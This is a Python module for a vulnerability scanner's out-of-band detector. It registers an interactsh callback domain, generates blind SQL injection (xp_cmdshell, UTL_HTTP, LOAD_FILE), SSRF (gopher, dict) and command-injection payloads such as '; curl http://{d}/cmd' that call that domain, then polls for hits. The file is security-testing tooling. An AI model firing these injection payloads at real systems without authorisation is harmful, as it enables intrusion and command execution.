"""OOB (Out-of-Band) 检测器 — DNSlog / HTTP callback 检测异步漏洞"""

import asyncio
import json
import logging
import secrets
import uuid
from typing import Optional

import httpx

logger = logging.getLogger(__name__)

# 默认 OOB 服务
DEFAULT_OOB_SERVICE = "oast.fun"
OOB_POLL_INTERVAL = 3
OOB_MAX_POLL_WAIT = 60


class OOBDetector:
    """OOB 带外检测器

    通过向目标发送包含回调域名的 payload，检测盲注/SSRF/命令注入。
    支持 interactsh (oast.fun) 和用户自定义回调域名。
    """

    def __init__(self, scan_id: str, callback_domain: str = ""):
        self.scan_id = scan_id
        self.logger = logging.getLogger(__name__)

        self.correlation_id: str = ""
        self.secret: str = ""
        self.poll_url: str = ""
        self.callback_domain: str = callback_domain or ""
        self.callback_full: str = ""

        self.oob_findings: list[dict] = []

    async def register(self, oob_domain: str = "") -> str:
        """注册 OOB 回调域名"""
        if oob_domain and oob_domain != "interactsh":
            self.callback_domain = oob_domain
            self.callback_full = f"{self.scan_id}.{oob_domain}"
            self.logger.info("OOB 使用自定义域名: %s", self.callback_full)
            return self.callback_full

        try:
            domain = oob_domain if oob_domain == "interactsh" else DEFAULT_OOB_SERVICE
            self.correlation_id = secrets.token_hex(32)
            self.secret = secrets.token_hex(32)
            self.callback_domain = domain

            register_url = f"https://{domain}/register"
            payload = {
                "correlation-id": self.correlation_id,
                "secret": self.secret,
                "public-key": "",
            }

            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(register_url, json=payload)
                if resp.status_code == 200:
                    subdomain = self.correlation_id[:32]
                    rest = self.correlation_id[32:]
                    self.callback_full = f"{subdomain}.{rest}.{domain}"
                    self.poll_url = f"https://{domain}/poll"
                    self.logger.info("OOB 注册成功: %s", self.callback_full)
                else:
                    self.logger.warning(
                        "OOB 注册失败 (%d)，使用 fallback: %s",
                        resp.status_code, domain,
                    )
                    self.callback_full = f"{self.scan_id}.{domain}"
        except Exception as e:
            self.logger.warning("OOB 注册异常: %s，使用 fallback", e)
            self.callback_full = f"{self.scan_id}.{DEFAULT_OOB_SERVICE}"

        return self.callback_full

    def get_sqli_oob_payloads(self) -> list[tuple[str, str]]:
        """生成 SQL 注入 OOB payload"""
        if not self.callback_full:
            return []
        d = self.callback_full
        return [
            (f"' OR LOAD_FILE('\\\\\\\\{d}\\\\probe')-- ", "MySQL OOB (LOAD_FILE UNC)"),
            ("' || UTL_HTTP.request('http://" + d + "/probe')||'", "Oracle OOB (UTL_HTTP)"),
            ("'; EXEC xp_cmdshell 'nslookup " + d + "';--", "MSSQL OOB (xp_cmdshell)"),
            ("'; EXEC master..xp_dirtree '\\\\\\\\" + d + "\\probe';--", "MSSQL OOB (xp_dirtree)"),
        ]

    def get_ssrf_oob_payloads(self) -> list[tuple[str, str]]:
        """生成 SSRF OOB payload"""
        if not self.callback_full:
            return []
        d = self.callback_full
        return [
            (f"http://{d}/ssrf", "SSRF HTTP callback"),
            (f"https://{d}/ssrf", "SSRF HTTPS callback"),
            (f"dict://{d}:1337/a", "SSRF dict protocol"),
            (f"gopher://{d}:1337/_test", "SSRF gopher protocol"),
        ]

    def get_cmd_oob_payloads(self) -> list[tuple[str, str]]:
        """生成命令注入 OOB payload"""
        if not self.callback_full:
            return []
        d = self.callback_full
        return [
            (f"; nslookup {d}", "CMD nslookup OOB"),
            (f"| nslookup {d}", "Pipe nslookup OOB"),
            (f"; curl http://{d}/cmd", "CMD curl OOB"),
            (f"; ping -c 3 {d}", "CMD ping OOB"),
        ]

    async def poll(self, timeout: int = OOB_MAX_POLL_WAIT) -> list[dict]:
        """轮询 OOB 回调"""
        if not self.poll_url:
            self.logger.info("OOB 无 poll 地址，跳过轮询")
            return []

        start = asyncio.get_event_loop().time()
        results = []

        while asyncio.get_event_loop().time() - start < timeout:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    resp = await client.get(
                        self.poll_url,
                        params={"id": self.correlation_id, "secret": self.secret},
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        if data.get("data"):
                            for entry in data["data"]:
                                results.append({
                                    "timestamp": entry.get("timestamp", ""),
                                    "remote_address": entry.get("remote-address", ""),
                                    "protocol": entry.get("protocol", ""),
                                    "type": "oob_callback",
                                })
                            if results:
                                self.logger.info("OOB 回调发现 %d 个", len(results))
                                return results
            except Exception:
                pass
            await asyncio.sleep(OOB_POLL_INTERVAL)

        return results
